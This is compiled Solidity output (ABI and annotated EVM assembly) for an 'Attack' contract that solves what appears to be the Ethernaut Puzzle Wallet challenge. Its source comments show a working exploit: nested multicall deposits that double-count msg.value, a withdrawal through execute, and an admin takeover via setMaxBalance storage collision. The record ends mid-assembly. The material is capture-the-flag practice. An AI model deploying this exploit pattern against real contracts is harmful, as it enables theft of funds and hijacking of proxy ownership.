{
	"puzle_wallet_solve_2.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_add2",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "run",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "wallet",
					"outputs": [
						{
							"internalType": "contract PuzzleWallet",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"puzle_wallet_solve_2.sol\":111:1249  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"puzle_wallet_solve_2.sol\":167:239  constructor(address _add2) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"puzle_wallet_solve_2.sol\":226:231  _add2 */\n  dup1\n    /* \"puzle_wallet_solve_2.sol\":204:210  wallet */\n  0x00\n  dup1\n    /* \"puzle_wallet_solve_2.sol\":204:232  wallet = PuzzleWallet(_add2) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"puzle_wallet_solve_2.sol\":167:239  constructor(address _add2) {... */\n  pop\n    /* \"puzle_wallet_solve_2.sol\":111:1249  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"puzle_wallet_solve_2.sol\":111:1249  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"puzle_wallet_solve_2.sol\":111:1249  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x521eb273\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xc0406226\n      eq\n      tag_4\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n      stop\n        /* \"puzle_wallet_solve_2.sol\":133:159  PuzzleWallet public wallet */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_7:\n      pop\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"puzle_wallet_solve_2.sol\":245:1106  function run() external{... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      stop\n        /* \"puzle_wallet_solve_2.sol\":133:159  PuzzleWallet public wallet */\n    tag_9:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"puzle_wallet_solve_2.sol\":245:1106  function run() external{... */\n    tag_14:\n        /* \"puzle_wallet_solve_2.sol\":278:308  bytes[] memory depositSelector */\n      0x00\n        /* \"puzle_wallet_solve_2.sol\":323:324  1 */\n      0x01\n        /* \"puzle_wallet_solve_2.sol\":311:325  new bytes[](1) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_16\n      jumpi\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n    tag_16:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_19\n      jumpi\n      dup2\n      0x20\n      add\n    tag_20:\n      0x60\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      0x01\n      swap1\n      sub\n      swap1\n      dup2\n      tag_20\n      jumpi\n      swap1\n      pop\n    tag_19:\n      pop\n        /* \"puzle_wallet_solve_2.sol\":278:325  bytes[] memory depositSelector = new bytes[](1) */\n      swap1\n      pop\n        /* \"puzle_wallet_solve_2.sol\":379:385  wallet */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":379:402  wallet.deposit.selector */\n      shl(0xe0, 0xd0e30db0)\n        /* \"puzle_wallet_solve_2.sol\":356:403  abi.encodeWithSelector(wallet.deposit.selector) */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":335:350  depositSelector */\n      dup2\n        /* \"puzle_wallet_solve_2.sol\":351:352  0 */\n      0x00\n        /* \"puzle_wallet_solve_2.sol\":335:353  depositSelector[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_21\n      jumpi\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n    tag_21:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"puzle_wallet_solve_2.sol\":335:403  depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector) */\n      dup2\n      swap1\n      mstore\n      pop\n        /* \"puzle_wallet_solve_2.sol\":413:443  bytes[] memory nestedMulticall */\n      0x00\n        /* \"puzle_wallet_solve_2.sol\":458:459  2 */\n      0x02\n        /* \"puzle_wallet_solve_2.sol\":446:460  new bytes[](2) */\n      0xffffffffffffffff\n      dup2\n      gt\n      iszero\n      tag_24\n      jumpi\n      tag_25\n      tag_18\n      jump\t// in\n    tag_25:\n    tag_24:\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_26\n      jumpi\n      dup2\n      0x20\n      add\n    tag_27:\n      0x60\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      0x01\n      swap1\n      sub\n      swap1\n      dup2\n      tag_27\n      jumpi\n      swap1\n      pop\n    tag_26:\n      pop\n        /* \"puzle_wallet_solve_2.sol\":413:460  bytes[] memory nestedMulticall = new bytes[](2) */\n      swap1\n      pop\n        /* \"puzle_wallet_solve_2.sol\":514:520  wallet */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":514:539  wallet.multicall.selector */\n      shl(0xe0, 0xac9650d8)\n        /* \"puzle_wallet_solve_2.sol\":541:556  depositSelector */\n      dup3\n        /* \"puzle_wallet_solve_2.sol\":491:557  abi.encodeWithSelector(wallet.multicall.selector, depositSelector) */\n      add(0x24, mload(0x40))\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":470:485  nestedMulticall */\n      dup2\n        /* \"puzle_wallet_solve_2.sol\":486:487  0 */\n      0x00\n        /* \"puzle_wallet_solve_2.sol\":470:488  nestedMulticall[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_30\n      jumpi\n      tag_31\n      tag_23\n      jump\t// in\n    tag_31:\n    tag_30:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"puzle_wallet_solve_2.sol\":470:557  nestedMulticall[0] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector) */\n      dup2\n      swap1\n      mstore\n      pop\n        /* \"puzle_wallet_solve_2.sol\":611:617  wallet */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":611:636  wallet.multicall.selector */\n      shl(0xe0, 0xac9650d8)\n        /* \"puzle_wallet_solve_2.sol\":638:653  depositSelector */\n      dup3\n        /* \"puzle_wallet_solve_2.sol\":588:654  abi.encodeWithSelector(wallet.multicall.selector, depositSelector) */\n      add(0x24, mload(0x40))\n      tag_32\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_32:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":567:582  nestedMulticall */\n      dup2\n        /* \"puzle_wallet_solve_2.sol\":583:584  1 */\n      0x01\n        /* \"puzle_wallet_solve_2.sol\":567:585  nestedMulticall[1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_33\n      jumpi\n      tag_34\n      tag_23\n      jump\t// in\n    tag_34:\n    tag_33:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"puzle_wallet_solve_2.sol\":567:654  nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector) */\n      dup2\n      swap1\n      mstore\n      pop\n        /* \"puzle_wallet_solve_2.sol\":700:706  wallet */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"puzle_wallet_solve_2.sol\":700:721  wallet.addToWhitelist */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe43252d7\n        /* \"puzle_wallet_solve_2.sol\":730:734  this */\n      address\n        /* \"puzle_wallet_solve_2.sol\":700:736  wallet.addToWhitelist(address(this)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_35\n      swap2\n      swap1\n      tag_36\n      jump\t// in\n    tag_35:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_37\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_37:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_39\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_39:\n      pop\n      pop\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":804:810  wallet */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"puzle_wallet_solve_2.sol\":804:820  wallet.multicall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xac9650d8\n        /* \"puzle_wallet_solve_2.sol\":828:839  0.001 ether */\n      0x038d7ea4c68000\n        /* \"puzle_wallet_solve_2.sol\":841:856  nestedMulticall */\n      dup4\n        /* \"puzle_wallet_solve_2.sol\":804:857  wallet.multicall{value: 0.001 ether}(nestedMulticall) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_40\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_40:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_41\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_41:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_43\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_43:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":915:921  wallet */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"puzle_wallet_solve_2.sol\":915:929  wallet.execute */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xb61d27f6\n        /* \"puzle_wallet_solve_2.sol\":938:942  this */\n      address\n        /* \"puzle_wallet_solve_2.sol\":945:956  0.002 ether */\n      0x071afd498d0000\n        /* \"puzle_wallet_solve_2.sol\":915:961  wallet.execute(address(this), 0.002 ether, \"\") */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_44\n      swap3\n      swap2\n      swap1\n      tag_45\n      jump\t// in\n    tag_44:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_46\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_46:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_48:\n      pop\n      pop\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":1049:1055  wallet */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"puzle_wallet_solve_2.sol\":1049:1069  wallet.setMaxBalance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x9d51d9b7\n        /* \"puzle_wallet_solve_2.sol\":1086:1096  msg.sender */\n      caller\n        /* \"puzle_wallet_solve_2.sol\":1070:1098  uint256(uint160(msg.sender)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"puzle_wallet_solve_2.sol\":1049:1099  wallet.setMaxBalance(uint256(uint160(msg.sender))) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_49\n      swap2\n      swap1\n      tag_50\n      jump\t// in\n    tag_49:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_51\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_51:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_53\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_53:\n      pop\n      pop\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":268:1106  {... */\n      pop\n      pop\n        /* \"puzle_wallet_solve_2.sol\":245:1106  function run() external{... */\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_54:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_55:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_56:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_85\n        /* \"#utility.yul\":306:340   */\n      tag_86\n        /* \"#utility.yul\":315:339   */\n      tag_87\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_54\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":306:340   */\n      tag_55\n      jump\t// in\n    tag_86:\n        /* \"#utility.yul\":288:341   */\n      tag_54\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_57:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_89\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_56\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:631   */\n    tag_58:\n        /* \"#utility.yul\":555:564   */\n      0x00\n        /* \"#utility.yul\":588:625   */\n      tag_91\n        /* \"#utility.yul\":619:624   */\n      dup3\n        /* \"#utility.yul\":588:625   */\n      tag_57\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":575:625   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:631   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":637:808   */\n    tag_59:\n        /* \"#utility.yul\":744:801   */\n      tag_93\n        /* \"#utility.yul\":795:800   */\n      dup2\n        /* \"#utility.yul\":744:801   */\n      tag_58\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":739:742   */\n      dup3\n        /* \"#utility.yul\":732:802   */\n      mstore\n        /* \"#utility.yul\":637:808   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":814:1076   */\n    tag_11:\n        /* \"#utility.yul\":927:931   */\n      0x00\n        /* \"#utility.yul\":965:967   */\n      0x20\n        /* \"#utility.yul\":954:963   */\n      dup3\n        /* \"#utility.yul\":950:968   */\n      add\n        /* \"#utility.yul\":942:968   */\n      swap1\n      pop\n        /* \"#utility.yul\":978:1069   */\n      tag_95\n        /* \"#utility.yul\":1066:1067   */\n      0x00\n        /* \"#utility.yul\":1055:1064   */\n      dup4\n        /* \"#utility.yul\":1051:1068   */\n      add\n        /* \"#utility.yul\":1042:1048   */\n      dup5\n        /* \"#utility.yul\":978:1069   */\n      tag_59\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":814:1076   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1082:1262   */\n    tag_18:\n        /* \"#utility.yul\":1130:1207   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1127:1128   */\n      0x00\n        /* \"#utility.yul\":1120:1208   */\n      mstore\n        /* \"#utility.yul\":1227:1231   */\n      0x41\n        /* \"#utility.yul\":1224:1225   */\n      0x04\n        /* \"#utility.yul\":1217:1232   */\n      mstore\n        /* \"#utility.yul\":1251:1255   */\n      0x24\n        /* \"#utility.yul\":1248:1249   */\n      0x00\n        /* \"#utility.yul\":1241:1256   */\n      revert\n        /* \"#utility.yul\":1268:1448   */\n    tag_23:\n        /* \"#utility.yul\":1316:1393   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1313:1314   */\n      0x00\n        /* \"#utility.yul\":1306:1394   */\n      mstore\n        /* \"#utility.yul\":1413:1417   */\n      0x32\n        /* \"#utility.yul\":1410:1411   */\n      0x04\n        /* \"#utility.yul\":1403:1418   */\n      mstore\n        /* \"#utility.yul\":1437:1441   */\n      0x24\n        /* \"#utility.yul\":1434:1435   */\n      0x00\n        /* \"#utility.yul\":1427:1442   */\n      revert\n        /* \"#utility.yul\":1454:1577   */\n    tag_60:\n        /* \"#utility.yul\":1530:1536   */\n      0x00\n        /* \"#utility.yul\":1564:1569   */\n      dup2\n        /* \"#utility.yul\":1558:1570   */\n      mload\n        /* \"#utility.yul\":1548:1570   */\n      swap1\n      pop\n        /* \"#utility.yul\":1454:1577   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1583:1776   */\n    tag_61:\n        /* \"#utility.yul\":1691:1702   */\n      0x00\n        /* \"#utility.yul\":1725:1731   */\n      dup3\n        /* \"#utility.yul\":1720:1723   */\n      dup3\n        /* \"#utility.yul\":1713:1732   */\n      mstore\n        /* \"#utility.yul\":1765:1769   */\n      0x20\n        /* \"#utility.yul\":1760:1763   */\n      dup3\n        /* \"#utility.yul\":1756:1770   */\n      add\n        /* \"#utility.yul\":1741:1770   */\n      swap1\n      pop\n        /* \"#utility.yul\":1583:1776   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1782:1923   */\n    tag_62:\n        /* \"#utility.yul\":1858:1862   */\n      0x00\n        /* \"#utility.yul\":1881:1884   */\n      dup2\n        /* \"#utility.yul\":1873:1884   */\n      swap1\n      pop\n        /* \"#utility.yul\":1911:1915   */\n      0x20\n        /* \"#utility.yul\":1906:1909   */\n      dup3\n        /* \"#utility.yul\":1902:1916   */\n      add\n        /* \"#utility.yul\":1894:1916   */\n      swap1\n      pop\n        /* \"#utility.yul\":1782:1923   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1929:2027   */\n    tag_63:\n        /* \"#utility.yul\":1980:1986   */\n      0x00\n        /* \"#utility.yul\":2014:2019   */\n      dup2\n        /* \"#utility.yul\":2008:2020   */\n      mload\n        /* \"#utility.yul\":1998:2020   */\n      swap1\n      pop\n        /* \"#utility.yul\":1929:2027   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2033:2191   */\n    tag_64:\n        /* \"#utility.yul\":2106:2117   */\n      0x00\n        /* \"#utility.yul\":2140:2146   */\n      dup3\n        /* \"#utility.yul\":2135:2138   */\n      dup3\n        /* \"#utility.yul\":2128:2147   */\n      mstore\n        /* \"#utility.yul\":2180:2184   */\n      0x20\n        /* \"#utility.yul\":2175:2178   */\n      dup3\n        /* \"#utility.yul\":2171:2185   */\n      add\n        /* \"#utility.yul\":2156:2185   */\n      swap1\n      pop\n        /* \"#utility.yul\":2033:2191   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2197:2336   */\n    tag_65:\n        /* \"#utility.yul\":2286:2292   */\n      dup3\n        /* \"#utility.yul\":2281:2284   */\n      dup2\n        /* \"#utility.yul\":2276:2279   */\n      dup4\n        /* \"#utility.yul\":2270:2293   */\n      mcopy\n        /* \"#utility.yul\":2327:2328   */\n      0x00\n        /* \"#utility.yul\":2318:2324   */\n      dup4\n        /* \"#utility.yul\":2313:2316   */\n      dup4\n        /* \"#utility.yul\":2309:2325   */\n      add\n        /* \"#utility.yul\":2302:2329   */\n      mstore\n        /* \"#utility.yul\":2197:2336   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2342:2444   */\n    tag_66:\n        /* \"#utility.yul\":2383:2389   */\n      0x00\n        /* \"#utility.yul\":2434:2436   */\n      0x1f\n        /* \"#utility.yul\":2430:2437   */\n      not\n        /* \"#utility.yul\":2425:2427   */\n      0x1f\n        /* \"#utility.yul\":2418:2423   */\n      dup4\n        /* \"#utility.yul\":2414:2428   */\n      add\n        /* \"#utility.yul\":2410:2438   */\n      and\n        /* \"#utility.yul\":2400:2438   */\n      swap1\n      pop\n        /* \"#utility.yul\":2342:2444   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2450:2803   */\n    tag_67:\n        /* \"#utility.yul\":2526:2529   */\n      0x00\n        /* \"#utility.yul\":2554:2592   */\n      tag_106\n        /* \"#utility.yul\":2586:2591   */\n      dup3\n        /* \"#utility.yul\":2554:2592   */\n      tag_63\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":2608:2668   */\n      tag_107\n        /* \"#utility.yul\":2661:2667   */\n      dup2\n        /* \"#utility.yul\":2656:2659   */\n      dup6\n        /* \"#utility.yul\":2608:2668   */\n      tag_64\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":2601:2668   */\n      swap4\n      pop\n        /* \"#utility.yul\":2677:2742   */\n      tag_108\n        /* \"#utility.yul\":2735:2741   */\n      dup2\n        /* \"#utility.yul\":2730:2733   */\n      dup6\n        /* \"#utility.yul\":2723:2727   */\n      0x20\n        /* \"#utility.yul\":2716:2721   */\n      dup7\n        /* \"#utility.yul\":2712:2728   */\n      add\n        /* \"#utility.yul\":2677:2742   */\n      tag_65\n      jump\t// in\n    tag_108:\n        /* \"#utility.yul\":2767:2796   */\n      tag_109\n        /* \"#utility.yul\":2789:2795   */\n      dup2\n        /* \"#utility.yul\":2767:2796   */\n      tag_66\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":2762:2765   */\n      dup5\n        /* \"#utility.yul\":2758:2797   */\n      add\n        /* \"#utility.yul\":2751:2797   */\n      swap2\n      pop\n        /* \"#utility.yul\":2530:2803   */\n      pop\n        /* \"#utility.yul\":2450:2803   */\n      